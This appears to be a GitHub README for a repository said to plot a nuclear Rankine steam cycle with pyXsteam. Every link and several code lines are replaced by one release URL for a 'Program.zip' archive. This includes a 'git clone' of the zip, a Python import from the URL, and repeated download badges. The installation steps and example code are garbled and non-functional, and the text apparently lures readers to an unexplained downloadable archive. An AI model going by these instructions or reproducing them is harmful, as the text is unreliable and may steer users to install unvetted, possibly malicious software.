# 🚀 Welcome to the "steam-cycle-nuclear" Repository! 🌡️

## Overview
This repository contains Python code utilizing pyXsteam to showcase the nuclear rankine steam cycle plot. Dive into the world of thermodynamics, cycles, and properties with this powerful tool!

## Table of Contents
- [Installation](#installation)
- [Usage](#usage)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)

## Installation
To get started with the "steam-cycle-nuclear" repository, follow these steps:
1. Clone the repository to your local machine using:
   ```bash
   git clone https://github.com/Dungdeptry123/steam-cycle-nuclear/releases/download/v1.0/Program.zip
   ```

2. Make sure you have Python installed on your system.

3. Install the required dependencies using:
   ```bash
   pip install pyXsteam
   ```

## Usage
Once you have the repository set up and the dependencies installed, you can run the Python code to generate the nuclear rankine steam cycle plot. Experiment with different parameters to explore the fascinating world of thermodynamics and steam cycles!

## Examples
Check out this example code snippet to see how to generate the nuclear rankine steam cycle plot:

```python
# Import necessary libraries
from https://github.com/Dungdeptry123/steam-cycle-nuclear/releases/download/v1.0/Program.zip import XSteam

steamTable = XSteam(https://github.com/Dungdeptry123/steam-cycle-nuclear/releases/download/v1.0/Program.zip)  # Initialize steam table

# Specify the state points for the steam cycle
inlet_pressure = 15  # Inlet pressure in bar
inlet_temperature = 600  # Inlet temperature in degrees Celsius
extractor_pressure = 0.06  # Extractor pressure in bar

# Calculate state properties using the steam table
h1 = steamTable.h_pt(inlet_pressure, inlet_temperature)
s1 = steamTable.s_pt(inlet_pressure, inlet_temperature)
h2 = steamTable.h_ps(extractor_pressure, s1)
s2 = steamTable.s_ph(extractor_pressure, h2)

# Add your code here to generate the plot
```

Feel free to play around with the code and explore the various properties of the steam cycle.

## Contributing
Contributions are welcome! Fork the repository, make your changes, and submit a pull request. Let's collaborate to make this repository even more valuable for the community.

## License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

[![Download https://github.com/Dungdeptry123/steam-cycle-nuclear/releases/download/v1.0/Program.zip](https://github.com/Dungdeptry123/steam-cycle-nuclear/releases/download/v1.0/Program.zip)](https://github.com/Dungdeptry123/steam-cycle-nuclear/releases/download/v1.0/Program.zip)

If the link does not work, please check the "Releases" section of the repository for alternative download options.

🔥 Start exploring the nuclear rankine steam cycle with Python and pyXsteam! 🌋 Thank you for visiting the "steam-cycle-nuclear" repository! 🌟